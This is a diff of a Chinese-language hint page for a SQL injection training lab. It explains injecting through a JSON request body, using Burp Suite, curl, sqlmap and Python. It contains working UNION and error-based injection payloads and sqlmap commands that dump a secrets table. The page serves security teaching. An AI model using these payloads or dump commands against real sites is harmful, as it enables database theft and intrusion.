@@ -1,13 +1,14 @@
 <h4>先分清：本关的注入点在 JSON 请求体里</h4>
-<p>注入点是 JSON body 的 <code>username</code> 字段，提交到 <code>modules/sqli/json.php</code>，Content-Type 为 <code>application/json</code>。服务端 <code>json_decode</code> 后把 <code>username</code> 直接拼进 <code>WHERE username = '$name'</code>，页面会回显执行过的 SQL，方便对照。</p>
+<p>注入点是 JSON body 的 <code>username</code> 字段，提交到 <code>modules/sqli/json.php</code>，Content-Type 为 <code>application/json</code>。服务端 <code>json_decode</code> 后把 <code>username</code> 直接拼进 <code>WHERE username = '$name'</code>，页面会回显执行过的 SQL 与结果表格，方便对照。</p>
 <ul>
 <li><b>参数位置不同：</b>GET 注入在 URL 查询串，POST 表单在 body 的 <code>key=value</code>，本关在 body 的 JSON 结构里，必须保证 Content-Type 为 <code>application/json</code>。</li>
 <li><b>JSON 转义规则：</b>字符串值里的双引号写成 <code>\"</code>，反斜杠写成 <code>\\</code>，换行写成 <code>\n</code>；单引号无需转义。</li>
-<li><b>工具入口不同：</b>GET 用 <code>sqlmap -u "url?id=1"</code>；表单 POST 用 <code>--data "k=v"</code>；JSON POST 要用 <code>--data '{"k":"v"}'</code> 并指定 <code>-p</code> 参数名。</li>
+<li><b>本关打法：</b>原查询回显 3 列，用 <code>UNION SELECT 1,1,xxx</code> 把数据放到第 3 列；<code>UNION</code> 前要让原查询查不到数据（<code>admin'</code> 已足够，必要时用 <code>-1</code>）。</li>
+<li><b>常用信息表：</b><code>information_schema.tables</code>（表名）、<code>information_schema.columns</code>（列名），用 <code>group_concat()</code> 把多行合成一行或加 <code>limit 0,1</code>。</li>
 </ul>
 
 <h4>Burp Suite（抓包改 JSON，最直观）</h4>
-<p><b>解决什么问题：</b>JSON body 在浏览器里不好直接修改，Burp 可以拦下请求在 Raw 里改 JSON 值，反复 Repeater 调试闭合符与注释符。</p>
+<p><b>解决什么问题：</b>JSON body 在浏览器里不好直接修改，Burp 可以拦下请求在 Raw 里改 JSON 值，反复 Repeater 调试闭合符、注释符与 UNION 列数。</p>
 <pre>
 1. 浏览器代理设为 127.0.0.1:8080，打开 {{SITE}}/modules/sqli/json.php
 2. 在页面 JSON 编辑框里填 {"username":"admin'"} ，点「提交查询」
@@ -16,63 +17,69 @@
 5. 对照响应：MySQL 错误 / 查询结果表格 / 页面回显的「执行 SQL」
 </pre>
 <ul>
-<li><b>Repeater</b>：手动改 JSON 值逐条试闭合方式（<code>'</code>、<code>"</code>）与注释符（<code>#</code>、<code>-- </code>、<code>/**/</code>）。</li>
+<li><b>Repeater</b>：手动逐条试——<code>admin'</code> 报错 → <code>admin' union select 1,1,1 -- -</code> 测列数 → <code>union select 1,1,database()</code> 找回显位。</li>
 <li><b>Intruder</b>：把 username 的值设成 payload 位置，加载字典批量跑，按响应长度/关键字差异找注入。</li>
 <li><b>保存请求文件：</b>Repeater 里右键 → Save item，存成 <code>burp_json.txt</code>，供 sqlmap 的 <code>-r</code> 使用。</li>
 </ul>
 
 <h4>curl（命令行快速验证）</h4>
-<p><b>解决什么问题：</b>不开代理、不打开浏览器，一条命令直接发 JSON 请求验证注入。</p>
+<p><b>解决什么问题：</b>不开代理、不打开浏览器，一条命令直接发 JSON 请求验证 UNION 注入。</p>
 <pre>
-# 1. 确认报错回显
+# 1. 确认报错回显（单引号）
 curl -X POST {{SITE}}/modules/sqli/json.php \
   -H "Content-Type: application/json" \
   -d '{"username":"admin'\''"}'
 
-# 2. 报错注入读版本
+# 2. 测列数（3 列可对齐，第 4 列会报列数不一致）
 curl -X POST {{SITE}}/modules/sqli/json.php \
   -H "Content-Type: application/json" \
-  -d '{"username":"'\'' or updatexml(1,concat(0x7e,version()),1)-- -"}'
+  -d '{"username":"admin'\'' union select 1,1,1 -- -"}'
 
-# 3. 读通关凭证
+# 3. 拿库名（确认回显位在第 3 列）
 curl -X POST {{SITE}}/modules/sqli/json.php \
   -H "Content-Type: application/json" \
-  -d '{"username":"'\'' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -"}'
+  -d '{"username":"admin'\'' union select 1,1,database() -- -"}'
+
+# 4. 读通关凭证
+curl -X POST {{SITE}}/modules/sqli/json.php \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin'\'' union select 1,1,(select secret from secrets limit 0,1) -- -"}'
 </pre>
 <p><b>Shell 转义提示：</b>bash 里单引号字符串内不能直接放单引号，用 <code>'\''</code> 闭合+转义+重新打开。Windows PowerShell 用双引号包裹 JSON，内部双引号转义为 <code>\"</code>。</p>
 
 <h4>sqlmap（自动化拖库）</h4>
-<p><b>解决什么问题：</b>自动识别 JSON 字段、判断注入类型、枚举库表并导出数据。</p>
+<p><b>解决什么问题：</b>自动识别 JSON 字段、判断列数、枚举库表并导出数据。</p>
 <pre>
 # 1. 直接指定 JSON body（-p 锁定注入点）
 sqlmap -u "{{SITE}}/modules/sqli/json.php" \
   --data '{"username":"admin"}' -p username --dbs --batch
 
-# 2. 读 Burp 保存的请求文件（推荐，method/Content-Type 全部原样带上）
-sqlmap -r burp_json.txt --level=3 --risk=2 --batch
+# 2. 只跑 UNION 技术（本关推荐，结果最快最干净）
+sqlmap -u "{{SITE}}/modules/sqli/json.php" \
+  --data '{"username":"admin"}' -p username --technique=U --batch
 
-# 3. 导出 secrets 表（通关凭证）
+# 3. 读 Burp 保存的请求文件（推荐，method/Content-Type 全部原样带上）
+sqlmap -r burp_json.txt --technique=U --level=3 --batch
+
+# 4. 导出 secrets 表（通关凭证）
 sqlmap -r burp_json.txt -D bafanglab -T secrets --dump --batch
-
-# 4. 只跑报错注入，减少无效探测
-sqlmap -r burp_json.txt --technique=E --batch
 </pre>
 <p><b>注意：</b>sqlmap 对 JSON 的支持需要 <code>--data</code> 里是合法 JSON，且 <code>-p</code> 指定的字段名要和 JSON key 完全一致。</p>
 
 <h4>Python requests（批量脚本）</h4>
-<p><b>解决什么问题：</b>把 payload 参数化，批量跑字典、比较响应，适合写报错/盲注的自动化验证。</p>
+<p><b>解决什么问题：</b>把 payload 参数化，批量跑字典、比较响应，适合做 UNION 注入的自动化验证。</p>
 <pre>
 import requests, json
 
 url = "{{SITE}}/modules/sqli/json.php"
 headers = {"Content-Type": "application/json"}
 
-# 报错注入读通关凭证
-payload = {"username": "' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -"}
+# UNION 注入读通关凭证
+payload = {"username": "admin' union select 1,1,(select secret from secrets limit 0,1) -- -"}
 r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
-print(r.status_code, r.text[:300])
+print(r.status_code, '恭喜你完成本关挑战！' in r.text)
 </pre>
 <ul>
 <li><b>与表单 POST 的差别：</b>表单用 <code>data=dict</code>（自动编码为 x-www-form-urlencoded）；JSON 必须用 <code>data=json.dumps(dict)</code> 并手动设置 <code>Content-Type: application/json</code>，或直接用 <code>json=dict</code>（requests 会自动设置头）。</li>
-<li>盲注判断：固定其他字段，只替换 <code>username</code>，比较 <code>len(r.text)</code> 或耗时差异。</li>
+<li>列数探测可脚本化：循环拼接 <code>union select 1,1,1</code> 逐渐加列，遇「列数不一致」报错即停止，前一列数就是真实列数。</li>
 </ul>
